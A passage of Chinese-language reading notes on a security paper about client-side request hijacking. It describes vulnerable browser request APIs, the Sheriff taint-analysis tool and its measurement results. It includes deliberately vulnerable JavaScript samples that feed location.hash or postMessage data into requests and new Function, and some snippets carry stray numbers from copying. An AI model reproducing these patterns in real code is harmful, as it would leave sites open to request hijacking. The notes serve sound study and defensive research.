title="RQ1：浏览器功能带来的攻击系统化分析"></a>RQ1：浏览器功能带来的攻击系统化分析</h4><p>​我们研究用于发送请求的各种浏览器方法和 API，并用特定功能标记每个方法和 API（例如，接受 javascript URI、允许设置请求正文等）。然后，我们回顾现有文献并进行全面的威胁建模分析，系统地评估攻击者可以操纵请求发送 API 的各个领域时出现的安全风险。</p><h4 id="RQ2：漏洞检测、漏洞存在率及其危害"><a href="#RQ2：漏洞检测、漏洞存在率及其危害" class="headerlink" title="RQ2：漏洞检测、漏洞存在率及其危害"></a>RQ2：漏洞检测、漏洞存在率及其危害</h4><p>毫无疑问可以推出，我们对真实网站中请求劫持这一更广泛问题的总体影响和普遍性几乎没有任何信息。</p><p>在本文中，我们的目标是通过量化野外请求劫持的普遍程度、识别易受攻击的行为并调查其影响来填补这一空白，以深入了解影响 Web 应用程序安全状况的根本问题和因素。</p><h4 id="RQ3：防护措施及其有效性"><a href="#RQ3：防护措施及其有效性" class="headerlink" title="RQ3：防护措施及其有效性"></a>RQ3：防护措施及其有效性</h4><p>当前许多研究的重点只是利用混淆代理缺陷的传统请求伪造攻击，因此，我们仍然缺乏对各种防御机制针对请求劫持客户端变体保护范围的全面了解。</p><h3 id="API功能带来的攻击的系统化分析——对RQ1的讨论"><a href="#API功能带来的攻击的系统化分析——对RQ1的讨论" class="headerlink" title="API功能带来的攻击的系统化分析——对RQ1的讨论"></a>API功能带来的攻击的系统化分析——对RQ1的讨论</h3><h4 id="浏览器API功能"><a href="#浏览器API功能" class="headerlink" title="浏览器API功能"></a>浏览器API功能</h4><p>本文的研究者们从<code>WHATWG </code>和<code>W3C</code>的存储库中进行了系统性的搜索，重点搜索了其中能创建网络请求的JS <code>API</code>，最后选出了6大类一共10个<code>API</code>。这些<code>API</code>都有不同的特点，并默认受到某些约束，例如同源策略。<strong>研究者们认为，加入CSP、COOP等额外策略并不能影响到底层软件的缺陷。</strong>在本节，本文的研究者们聚焦在这些默认受到约束的<code>API</code>，希望发现默认设置下的可能攻击方式。</p><p>研究者们探索出来的10种<code>API</code>：</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-18_21-25-53.png" class=""><h4 id="CSRH攻击的系统分析"><a href="#CSRH攻击的系统分析" class="headerlink" title="CSRH攻击的系统分析"></a>CSRH攻击的系统分析</h4><p><strong>基于第2.2节的威胁模型：攻击者可以控制4.1节中提出的API发出的网络请求中的URL（在这里可以认为是请求头和请求体）</strong></p><p>本文的研究者通过系统地分析前人的资料，并检验了那些由于攻击者能够操纵每个发送请求<code>API</code>的不同字段所带来的潜在攻击。结果发现了一共10种CSRH攻击变体，并且其中只有3种被熟知。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_11-31-49.png" class=""><p><strong>以下列出几种脆弱的API及其存在风险：</strong></p><p>​<strong>异步请求(Asynchronous Requests)：</strong></p><p>​像<code>XMLHttpRequest</code>或者低层次<code>fetch</code>这种没有造成顶层页面重载的异步请求都被常用于和web服务通信。攻击者操纵URL、body和header等等都能导致客户端出现不可控的行为，代表就是CSRF攻击。这种攻击方式可以产生信息泄露，攻击者将受害者的敏感信息如登录凭证包含在请求体中，发送到有害的主机。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-18_22-12-33.png" class=""><p>​<strong>推送请求(Push Request)：</strong></p><p>​Web Push API是一种用于实现推送通知功能的Web标准API。它允许网站向用户的设备（如桌面浏览器或移动设备）发送实时通知，即使用户当前没有打开该网站。当推送订阅没有做好CSRF防护时，会产生CSRF攻击。</p><p>​服务工作者是一个JavaScript脚本，运行在浏览器的后台，独立于网页。它充当推送通知的中间人，处理接收到的推送消息并显示通知。</p><p>参考<a href="https://m.freebuf.com/vuls/200711.html?utm_source=joyk.com&utm_medium=referral&hmsr=joyk.com">谷歌推送接口劫持实例</a>，没有做好CSRF防御的PushRequest接口导致的经典CSRF攻击，从而造成用户信息泄露。攻击手段我画了下面这张图：</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_13-38-39.png" class=""><p>关于论文中提到的推送API造成的客户端DOS，我没有发现公开的实例，只能作出下面的猜测：攻击者通过某种手段获取到了用户在某网站的cookie后，通过模拟sw.js请求，请求大量推送，从而对目标浏览器造成DOS攻击。</p><p>​<strong>服务端发送事件(Server-Sent Events)：</strong></p><p>​<code>SSE</code>是一种服务端向浏览器推送消息的单向通信机制，而<code>Push Request API</code>则是一种允许客户端发起请求并接收服务器推送消息的双向通信机制。</p><p>​原文中说攻击者操纵参数就可以实现劫持，这里没有看到合适的实例或者更清晰的解释。好像国内外对此研究或者攻击都比较少。先放在这里。</p><p>​<strong>Web Sockets：</strong></p><p>​<code>WebSocket</code>是一种在Web应用程序中实现双向通信的协议和<code>API</code>。它提供了一种持久化的连接，允许服务器和客户端之间进行实时的双向数据传输。<code>WebSocket</code>通过建立一条持久化的连接，避免了每次通信都需要创建新的HTTP请求的开销。一旦连接建立，服务器和客户端之间可以长时间保持连接状态，实现实时通信。</p><p>​<code>WebSocket</code>和<code>HTTP</code>的区别：大多数的Web浏览器和Web网站都是使用HTTP协议进行通信的。通过HTTP协议，客户端发送一个HTTP请求，然后服务器返回一个响应。通常来说，服务端返回一个响应后，这个HTTP请求事务就已经完成了。即使这个HTTP连接处于<code>keep-alive</code>的状态，它们之间的每一个工作(事务)依然是请求与响应，请求来了，响应回去了。这个事务就结束了。所以通常来说，HTTP协议是一个基于事务性的通信协议。</p><p>​而<code>WebSocket</code>呢，它通常是由HTTP请求发起建立的，建立连接后，会始终保持连接状态。客户端和服务端可以随时随地的通过一个<code>WebSocket</code>互发消息，没有所谓事务性的特点。这里要注意了，源于其双向全双工的通信特点，在一个<code>WebSocket</code>连接中，服务端是可以主动发送消息的哦，这一点已经完全区别于HTTP协议了。</p><p>​因此，基于以上特点，<code>WebSocket</code>通常用于低延迟和允许服务器发送消息的场景。例如，金融行业常用<code>WebSocket</code>来传输实时更新的数据</p><p>​这篇文章的研究者提出，攻击者在控制了<code>WebSocket</code>连接的情况下，可以作为中间人，连接受害者和目标服务器。</p><p>参考<a href="https://cloud.tencent.com/developer/article/1423227">利用CSWH漏洞实现用户密码重置实例</a>，没有做好CSRF防御导致的攻击。攻击手段我画了下面这张图：</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_11-28-40.png" class=""><p>​<strong>顶级导航请求(Top-Level Navigation Requests)：</strong></p><p>​前面的案例已经研究过了，浏览器的顶层API导致重定向到恶意页面。</p><p>​<strong>窗口导航请求(Window Navigation Requests)：</strong></p><p>​类似<code>location API</code>，前面已经分析过了。</p><h4 id="不同API的流行程度"><a href="#不同API的流行程度" class="headerlink" title="不同API的流行程度"></a>不同API的流行程度</h4><p>​研究者发现 9,901 个域至少包含一个与客户端请求相关的 API，在约 100 万个网页中总共有约 790 万次 API 调用。通过<code>location.href</code>的顶级导航请求最为普遍，出现在超过 8K 的网站上。通过<code>XMLHttpRequest API</code>的异步请求使用最广泛，在超过 400K 的页面上有近 300 万次调用。考虑我们提出的新漏洞变体，之前的研究工作中有超过 44.7% 的<code>API</code>调用忽略了请求劫持威胁。</p><h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>本文的研究者们开发出了一款动静态结合分析工具<code>Sheriff</code>，其主要基于4个主要部分：</p><ul><li>数据收集模块：从网页收集<code>Web</code>资源和动态污点流</li><li>数据建模模块：通过处理数据识别和建模独特的网页，并为其创建属性图</li><li>漏洞分析模块：</li><li>动态验证模块</li></ul><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_19-40-59.png" class=""><h4 id="数据收集"><a href="#数据收集" class="headerlink" title="数据收集"></a>数据收集</h4><p>本文的研究者们表示，数据收集的第一步是收集客户端的代码和运行时的参数值(比如<code>DOM</code>快照)。研究者基于<code>playwright</code>、<code>Foxhound</code>和<code>Firefox Devtools</code>开发了一个污点感知爬虫。同时由于<code>Foxhound</code>不支持所有的测试API，研究者们自己开发了支持，称为<code>Foxhound+</code>。</p><p>这个爬虫采用深度优先搜索的方式，对于一个输入，会爬取这个页面中的所有<code>URL</code>，然后爬取新<code>URL</code>中的所有<code>URL</code>，上限为200个。</p><p>在访问过程中，爬虫会收集以下信息：网页资源（例如脚本）、DOM快照、全局对象的属性、事件跟踪、网络请求和响应，以及从程序输入到安全敏感指令（例如请求）的动态污点流。</p><p>这个爬虫不会创建帐户或登录，因为手动创建和维护注册和登录脚本既脆弱又具有挑战性，特别是在处理数千个应用程序时。此限制符合大规模安全测试的最新技术，比如文章<a href="https://swag.cispa.saarland/papers/klein2022hand.pdf">S&amp;P2022</a>中也是如此。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_13-34-31.png" class=""><p><code>Playwright</code>是一个开源的自动化测试工具,用于测试网页应用。它可以操控<code>Chromium</code>(用于<code>Chrome</code>、<code>Edge</code>等)、<code>Firefox</code>和<code>WebKit</code>(用于<code>Safari</code>)等主流浏览器,使我们能在不同浏览器中执行自动化测试。<code>Playwright</code>通过直接控制浏览器引擎(如<code>Chromium</code>和<code>Firefox</code>)来执行测试,而不是通过浏览器界面。这意味着<code>Playwright</code>可以直接操控浏览器引擎,执行更快速和稳定的测试。<code>Playwright</code>使用浏览器引擎自带的<code>JavaScript</code>执行环境和<code>Web API</code>来控制浏览器。</p><p>这个脚本会打开<code>Chromium</code>浏览器,访问<code>example.com</code>网站,获取网页标题并打印,最后关闭浏览器。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> playwright.sync_api <span class="hljs-keyword">import</span> sync_playwright<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">playwright</span>):<br>    chromium = playwright.chromium<br>    browser = chromium.launch()<br>    page = browser.new_page()<br>    page.goto(<span class="hljs-string">"https://www.example.com/"</span>)<br>    title = page.title()<br>    <span class="hljs-built_in">print</span>(title)<br>    browser.close()<br><br><span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> playwright:<br>    run(playwright)<br></code></pre></td></tr></table></figure><p><code>Foxhound</code>：一个在<code>Javascript</code>引擎和<code>DOM</code>中启用动态数据流跟踪的 Web 浏览器，基于<code>Mozilla Firefox</code>，它可用于识别客户端 Web 应用程序中不安全的数据流或数据隐私泄漏。</p><p><a href="https://github.com/SAP/project-foxhound">Foxhound</a></p><h4 id="数据建模"><a href="#数据建模" class="headerlink" title="数据建模"></a>数据建模</h4><p>​鉴于爬虫收集的网页数据，出于效率和可扩展性的原因，<code>Sheriff</code>会执行数据预处理。例如，<code>Sheriff</code>通过比较<code>SHA-256</code>脚本哈希值对客户端代码进行预处理，以过滤掉几乎重复的网页，这使其能够专注于具有不同<code>JavaScript</code>代码的页面，从而减少程序分析的总体工作量。同样，<code>Sheriff</code>可以执行其他类型的数据预处理，例如先前工作中使用的基于（自定义）搜索的数据过滤或代码规范化。</p><p>​删除重复的网页后，<code>Sheriff</code>创建被测客户端程序的属性图，捕获静态和动态程序行为，称为混合属性图<code>HPG</code>。 <code>Sheriff</code>使用<code>JAW</code>的扩展引擎实例化一个工作池来生成<code>HPG</code>。然后，这些<code>HPG</code>通过<code>Foxhound+</code>提供的污点流信息进行丰富，以修补由于静态分析缺陷而缺失的<code>HPG</code>边缘，最后存储在<code>Neo4j</code>图数据库中，我们可以查询该数据库进行安全测试。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_13-58-46.png" class=""><h5 id="HPG介绍"><a href="#HPG介绍" class="headerlink" title="HPG介绍"></a>HPG介绍</h5><p><code>USENIX Security Symposium</code>2021的一篇文章中提出了<code>JAW</code>框架，里面提出并详细介绍了<code>HPG</code>。</p><p><code>HPG</code>这是一种基于图的规范<code>JavaScript</code>程序模型，用于<code>JS</code>代码的分析</p><p><a href="https://www.usenix.org/system/files/sec21-khodayari.pdf">JAW: Studying Client-side CSRF with Hybrid Property Graphs and Declarative Traversals</a></p><p><code>JAW</code>，这是一个框架，可以利用混合属性图（<code>JavaScript</code>程序的规范混合模型）上的声明性遍历来针对客户端 <code>CSRF</code>分析现代<code>Web</code>应用程序。</p><p>要了解<code>HPG</code>，我觉得应该首先了解代码属性图CPG。<a href="https://zhuanlan.zhihu.com/p/395133924">参考文章</a></p><p>显然，<code>CPG</code>是一种图数据结构，它的主要思想如下：</p><ul><li><code>CPG</code>将多个程序表示(program representations)整合成一个</li><li><code>CPG</code>数据被存储在图数据库中</li><li>通过<code>DSL</code>在图数据库中遍历和查询<code>CPG</code>数据</li></ul><p>CPG 整合了 <code>AST(abstract syntax trees)</code>、<code>CFG(control flow graphs)</code>、<code>PDG(program dependence graphs)</code> 到一种数据结构当中。一个很知名的基于CPG原理的国产Java漏洞分析工具<a href="https://github.com/wh1t3p1g/tabby">Tabby</a></p><p>抽象语法树(AST)：以树的形式表现编程语言，树上的每个节点都表示源代码中的一种结构。AST一般作为源代码语法分析的重要思想，在编译原理这门课中应该会介绍。AST的应用其实是非常常见的，像是编辑器的错误提示、代码格式检查都用到了AST的原理。</p><p>程序依赖图(PDG)：处理方法是以程序的控制流图为基础，去掉CFG的控制流边，加入数据和控制流边。包括了数据依赖图和程序依赖图。数据依赖图定义了数据之间的约束关系，控制依赖图定义了语句执行情况的约束关系。程序依赖图是一个有向图。</p><p>根据下面的程序画出的图：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">int</span> x = <span class="hljs-built_in">source</span>();<br>    <span class="hljs-keyword">if</span> (x &lt; MAX)<br>    {<br>        <span class="hljs-type">int</span> y = <span class="hljs-number">2</span>*x;<br>        <span class="hljs-built_in">sink</span>(y);<br>    }<br>}<br></code></pre></td></tr></table></figure><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_21-22-48.png" class=""><p>三者合一成为<code>CPG</code>:</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_21-23-45.png" class=""><p>下面我们可以详细讨论文章中提出的<code>HPG</code>：这是论文中存在CSRF攻击的样例代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JS"><span class="hljs-keyword">var</span> i = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'输入'</span>);<br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">h</span>(<span class="hljs-params">e</span>){ <br>    <span class="hljs-keyword">var</span> uri = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substr</span>(<span class="hljs-number">1</span>) ;<br>    <span class="hljs-keyword">if</span> ( uri.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) { <br>        <span class="hljs-keyword">let</span> req = <span class="hljs-keyword">new</span> asyncRequest (<span class="hljs-string">" POST "</span> , uri ); <br>        <span class="hljs-comment">// 添加同步器令牌 </span><br>        req.<span class="hljs-title function_">initHeader</span>(<span class="hljs-string">'X-CSRF-TOKEN'</span>, token); <br>        <span class="hljs-keyword">var</span> 价格 = wait req.<span class="hljs-property">send</span> () ; <span class="hljs-number">9</span> i.<span class="hljs-property">value</span> = 价格;<br>    }<br>} <br>i.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'loadInvoice'</span>, h); <br>... <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">showInvoicePrice</span> ( input_id ) { <br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(input_id).<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'loadInvoice'</span>, {}));<br>}<br><span class="hljs-title function_">showInvoicePrice</span>(<span class="hljs-string">'input'</span>);<br></code></pre></td></tr></table></figure><p>原文中的<code>HPG</code>图：说实话，根本没有看懂哈哈哈哈。先放在这里吧。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_22-40-34.png" class=""><p>​那么基于<code>CPG</code>的思想，<code>HPG</code>就是在<code>JavaScript</code>代码上的一个特化。简单来说，<code>HPG</code>是一种基于图的规范<code>JavaScript</code>程序模型，用于<code>JS</code>代码的分析。反正最后我们知道，<code>HPG</code>是客户端 <code>JavaScript</code>程序的统一表示，<strong>它将静态代码表示和运行时状态值集成到基于图形的结构中</strong>。</p><p>​状态值是在执行过程中观察到的具体程序值，例如<code>Web</code>存储值和<code>cookie</code>。<code>HPG</code>集成了多种静态代码表示，即抽象语法树 (AST)、控制流图 (CFG)、调用图 (CG)、程序依赖图 (PDG) 以及事件注册、调度和依赖图 (ERDDG)，它们分别捕捉程序的语法嵌套、执行顺序、函数调用关系、数据流和控制依赖性以及事件驱动的控制传输。<code>HPG</code>还包含语义类型，它们是分配给节点（例如接收器和源）的标签，用于捕获指令的语义含义。<code>HPG</code>编码为有向图，采用标记属性图结构，其中节点和边拥有标签和键值属性。</p><p>​总之就是基于<code>HPG</code>，我们可以便捷地分析<code>JavaScript</code>的代码片段。</p><h5 id="改进：Taintflow-Augmented-TA-HPGs"><a href="#改进：Taintflow-Augmented-TA-HPGs" class="headerlink" title="改进：Taintflow-Augmented (TA) HPGs"></a>改进：Taintflow-Augmented (TA) HPGs</h5><p>​研究者们制定了<code>HPG</code>上的请求劫持漏洞检测任务，打算识别在页面加载时触发的请求发送指令，因为这些指令容易被攻击者通过程序输入操纵。</p><p>​不幸的是，由于客户端<code>JavaScript</code>程序的动态特性，执行此类过程间可达性和数据流分析任务并非易事。虽然<code>HPG</code>状态值（即环境属性和事件跟踪）通过对具体对象快照（例如，指向分析和触发的分析）进行推理，有助于减轻许多<code> JavaScript</code>静态分析缺点（例如，不精确的控制和数据流依赖性事件处理程序），但也不足以识别图中许多其他丢失的调用和数据流连接。</p><p>​在本文中，<strong>研究者使用成熟的浏览器内动态污点跟踪，通过向节点添加补充边和标签（例如，标记可达性、语义类型和运行时变量值）来进一步增强HPG，从而重建缺失连接使得其在页面加载时可以访问，否则静态分析会错过这些</strong>。</p><p>​我们使用<code>Foxhound+</code>收集从输入源到所有接收器类型的动态污点流，包括那些不是请求发送指令的指令，以便补充<code>HPG</code>中尽可能多的可能缺失元素。</p><p>​具体来说，首先从<code>Foxhound+</code>中提取动态调用图和数据流图，并将它们分别与静态调用图和<code>PDG</code>合并。为了进行动态和静态图之间的匹配以进行合并，我们首先通过比较两个模型中的脚本哈希来确定指令或节点位于哪个脚本文件中，然后使用代码行来确定顶层（即<code>CFG</code>）该指令的<code>HPG</code>中的节点。</p><p>​将动态数据流图与<code>PDG</code>合并时，如果缺少边，我们将创建数据依赖边，标签是传播其数据的污点流中报告的变量名称。相反，如果两个节点之间已经存在<code>PDG</code>边，我们会向该边添加一个标签，标记传播变量的运行时值。</p><p>​类似地，当合并两个调用图时，如果缺少一条新边，我们将创建一条新边，并用调用的函数和参数名称以及函数调用的具体参数值对其进行标记。然而，当<code>HPG</code>中存在调用边缘时，我们只能通过添加调用站点参数的运行时值来丰富其信息。</p><p>​最后，我们为所有源节点和接收节点添加标签作为语义类型，捕获这些指令的语义，例如，为读取<code>document.URI</code>值的指令设置类型<code>RD_DOC_URL</code>，然后在计算后传播到其他<code>HPG</code>节点的程序。</p><p>​为了增强<code>JAW</code>的<code>HPG</code>生成，我们做了一些修改，解决了<code>ES6</code>支持不完整的问题，以改进控制传输建模和数据流分析。例如，我们使用<code>Promise</code>对象和<code>setTimeout()</code>回调添加了对异步操作的支持，提高了调用图和<code>PDG</code>边的精度。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_16-07-21.png" class=""><p>​此外，我们应用了多种优化来提高可扩展性，例如处理<code>PDG</code>构建期间迭代构造的低效率问题，以及通过使用<code>ineo</code>创建协调器来并行管理<code>Neo4j</code>图形数据库。总体而言，这些修改解决了 <code>JAW</code>的几个缺点，使<code>HPG</code>的构建能够进行更精确的分析并提高了可扩展性。</p><p>​下方右侧的图显示了 Sheriff 为下方左侧中的代码生成的 TA-HPG，它增加了由于动态函数调用而丢失的 HPG 边缘。特别关注的是，Sheriff 使用 Foxhound+ 提供的动态污点流添加第 26 行中的调用表达式节点和第 17 行中的函数声明节点之间的调用边，以及 (ii) 从第 13 行中的赋值表达式到第 26 行中的调用表达式节点用于调用参数 u 和 d。</p><pre><code class="hljs"> 因此，TA-HPG 遍历现在可以从 L12 中的源节点开始，经过 L13、L26 和 L17 节点，最后到达接收器指令，该接收器指令拾取攻击者控制的值。</code></pre><p>实例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> c = {}, i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// handle incoming postMessages</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"message"</span>, h); <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">h</span>(<span class="hljs-params">e</span>){ <br>    <span class="hljs-keyword">if</span>(e.<span class="hljs-property">origin</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">"bbc.com"</span>) &gt; -<span class="hljs-number">1</span>){ <br>        i = i + <span class="hljs-number">1</span>; <br>    <span class="hljs-comment">// [...] </span><br>        <span class="hljs-keyword">var</span> d = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({<br>            <span class="hljs-string">"csrf_token"</span>: <span class="hljs-string">"xyz-token"</span>,<br>            <span class="hljs-string">"state"</span>: {...}, <span class="hljs-number">11</span> });<br>            <span class="hljs-keyword">var</span> u = e.<span class="hljs-property">data</span> + <span class="hljs-string">'/userinfo'</span>;<br>            c[<span class="hljs-string">"r"</span> + i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">"httpPostRequest("</span>+ u + <span class="hljs-string">","</span> + d + <span class="hljs-string">")"</span>);<br>    }<br>}<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">httpPostRequest</span>(<span class="hljs-params">url, body</span>){ <br>    <span class="hljs-comment">// [...]</span><br>    navigator.<span class="hljs-title function_">sendBeacon</span>(url, body) <br>}<br><span class="hljs-comment">// remember state upon closing the session </span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"visibilitychange"</span>, saveState);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">saveState</span>(<span class="hljs-params">e</span>) { <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">visibilityState</span> === <span class="hljs-string">"hidden"</span>) { <br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> j=<span class="hljs-number">1</span>; j&lt;= i; j++){<br>            c[<span class="hljs-string">"r"</span> + j](); <br>        } <br>    }<br>}<br></code></pre></td></tr></table></figure><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_15-06-35.png" class=""><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​将客户端代码建模为<code>TA-HPG</code>后，<strong>研究者将检测请求劫持漏洞的任务定义为图遍历问题</strong>。具体来说，假设攻击者已经控制了某些指令的参数输入，现在搜索出页面加载时发送敏感请求的程序指令。</p><p>​第一步，识别读取攻击者控制的输入的<code>TA-HPG</code>源，并为它们分配一个与<code>JAW</code>类似的相关语义类型，例如，我们为读取的指令设置一个名为 <code>RD_WIN_LOC</code>的标签通过<code>window.location API</code>获取<code>URL</code>。然后，给定用于发送请求的浏览器<code>API</code>列表，Sheriff 搜索<code>TA-HPG</code>以识别使用这些<code>API</code>的节点，并通过为它们分配相关的语义类型将它们标记为接收器，例如，标签 <code>WR_ASYNC_REQ_URL</code>是为写入异步请求的<code>URL</code>的指令设置的，例如<code>XMLHttpRequest.open()</code>。</p><p>​最后，为了发现易受攻击的路径，<code>Sheriff</code>通过在<code>PDG</code>、<code>CFG</code>、<code>CG</code>和<code>ERDDG</code>边上将语义类型从源传播到接收器来执行数据流分析，其中具有接收器语义类型的节点被源类型污染，并且获取攻击者控制的值。</p><p>​然后执行可达性分析，以检查易受攻击的路径是否可能对应于页面加载时执行的代码行。为此，它从污染源节点和sink node(污染数据的关键中转调用点)开始，向后跟踪 <code>CFG</code>、<code>ERDDG</code>和<code>CG</code>边，直到到达<code>CFG</code>入口节点或不再存在与回溯条件匹配的边，并选择污染源节点和sink node都存在的数据流。那么此接收器是可到达的节点。最终，该组件输出一组具有从源到请求接收器的潜在数据流的路径。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-20_01-01-49.png" class=""><h3 id="漏洞验证方法"><a href="#漏洞验证方法" class="headerlink" title="漏洞验证方法"></a>漏洞验证方法</h3><p>​研究者通过<code>Playwright</code>和<code>Chrome DevTools Protocol</code>来执行运行时监控，检测了负责发送请求的浏览器 <code>API</code>并拦截页面加载时发生的网络消息。为了最大限度地规避造成实际危害，验证模块检测请求<code>API</code>仅记录请求参数，而不实际向服务器端发送任何请求。对于每个实时页面，会首先比较其与数据集里的哈希值。如果相同的话，选择实时运行的页面进行监控。这样做是为了保证使用的是收集时的页面。</p><p>​然后，对于每个请求劫持数据流，我们向相应的源输入一个无害的<code>token</code>，在由<code>Playwright</code>控制的检测浏览器中加载网页，并在客户端请求中搜索这个<code>token</code>以检查是否观察到了被操纵的输入。由于<code>DOM</code>环境不同，即使相同的页面，可能会有不同的执行结果，所有接近重复的页面也会测试每个候选数据流。</p><h3 id="实证评估"><a href="#实证评估" class="headerlink" title="实证评估"></a>实证评估</h3><p>​表 3 总结了数据收集和建模步骤的结果。从 10K 种子 URL 开始，<code>Sheriff</code>在所有网站上总共获得了约1M个网页。每个网站的平均为103个页面。这些 100 万个页面包含大约 4610 万个脚本。页面重复数据删除将数据集的大小减少了约17%。也就是说，在总共 100 万个网页中，有 867,455个页面是唯一的</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-20_22-25-11.png" class=""><p>​考虑到原始数据的庞大规模以及分析数十万个网页的需要，研究者通过将测试工作集中在每个网站中动态污点流频率最高的前 50 个页面上，进一步缩小了测试床的大小（源自输入源并到达请求发送接收器），这是基于这些页面包含漏洞的概率较高。总之，867K 个唯一页面包含约 720 万个动态污点流，这些流向请求发送接收器，我们将其用于页面选择。因此，867K 网页被过滤为 339,267 个页面。其中，Sheriff 提取了 11,544,754 个脚本和 21.6M动态污点流，用它们来丰富 HPG，以修复静态分析未发现的缺失连接。在这 2160 万个污点流中，有 3,318,747 个流包含请求发送接收器，这可以表明存在请求劫持漏洞。 Sheriff 总共平均处理 34 个脚本和每页 95K LoC，生成 339,267 个 TA-HPG。</p><p>​<strong>在可被劫持的各种类型的请求中，异步请求最为普遍 (85%)，在 905 个站点中有超过 172K 个实例。有趣的是，窗口导航请求(Window Navigation Requests)是第二常见的（8.2%），占 365 个站点。在另一个极端，被劫持的推送请求和 EventSource 发生的频率最低，分别仅影响 25 个和 3 个站点的约 0.3% 的请求流。最后，被劫持的 WebSocket劫持和顶级请求(Top-level Request)表现出中等程度的流行程度，相当于总共约 6% 的易受攻击的数据流。</strong></p><p>​新漏洞类型和变体构成了请求劫持的很大一部分（即 36.1%）。首先，新漏洞类型占已发现案例总数 23.6 万个的 14.2%（35,159 个）以上。其中，Sheriff 验证了 10,925 个网页和 439 个站点的 28,827 